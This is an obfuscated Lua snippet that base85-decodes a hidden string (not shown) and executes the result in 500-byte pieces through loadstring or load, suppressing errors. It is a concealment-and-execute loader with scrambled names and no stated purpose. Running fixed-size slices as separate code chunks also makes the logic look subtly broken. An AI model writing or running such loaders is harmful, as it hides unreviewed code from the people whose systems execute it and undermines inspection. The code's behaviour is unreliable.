zgmY=zgmY:gsub("z","!!!!!")
local function pSBM(zgmY)
  local wAnW={}
  local mP=0x1
  local IDb=#zgmY
  for Gr=0x1,IDb,0x5 do
    local c=zgmY:sub(Gr,Gr+0x4)
    if #c==0x5 then
      local JS=0x0
      for sF=0x1,0x5 do
        JS=JS*0x55+(c:byte(sF)-0x21)
      end
      wAnW[mP]=string.char((JS>>0x18)&0xFF)
      wAnW[mP+0x1]=string.char((JS>>0x10)&0xFF)
      wAnW[mP+0x2]=string.char((JS>>0x8)&0xFF)
      wAnW[mP+0x3]=string.char(JS&0xFF)
      mP=mP+0x4
    end
  end
  return table.concat(wAnW)
end
local cox=loadstring or load
local tNj=pSBM(zgmY)
local RhF=""
local IDb=#tNj
for oot=0x1,IDb,0x1F4 do
  local suU=oot+0x1F4-0x1
  if suU>IDb then suU=IDb end
  RhF=tNj:sub(oot,suU)
  local fn,err=cox(RhF)
  if fn then fn() end
end
